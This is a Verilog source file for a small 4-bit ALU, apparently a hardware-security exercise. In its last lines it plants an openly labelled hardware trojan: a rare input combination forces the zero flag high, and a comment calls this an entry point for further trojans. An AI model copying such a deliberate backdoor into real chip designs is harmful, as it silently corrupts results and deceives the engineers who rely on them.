`timescale 1ns/1ns

module alu (
    input  wire [3:0] A,      
    input  wire [3:0] B,       
    input  wire [1:0] op,      
    output reg  [3:0] Y,      
    output wire carry_out, 
    output wire zero_flag  
);

    wire [3:0] sum;
    wire [3:0] diff;
    wire [3:0] and_out;
    wire [3:0] or_out;
    wire carry_add;
    wire carry_sub;

    assign {carry_add, sum} = A + B;      
    assign {carry_sub, diff} = A - B;      
    assign and_out = A & B;                
    assign or_out  = A | B;               

    always @(*) begin
        case (op)
            2'b00: Y = sum;      
            2'b01: Y = diff;  
            2'b10: Y = and_out; 
            2'b11: Y = or_out; 
            default: Y = 4'b0000;
        endcase
    end

    assign carry_out = (op == 2'b00) ? carry_add :
                       (op == 2'b01) ? carry_sub : 1'b0;

    wire trojan_trigger = (A == 4'b1000) & (B == 4'b1001) & (op==2'b11);
    //from here, I can use this as an entry point to activate other trojan scripts

    assign zero_flag = (Y == 4'b0000) || (trojan_trigger) ;

endmodule
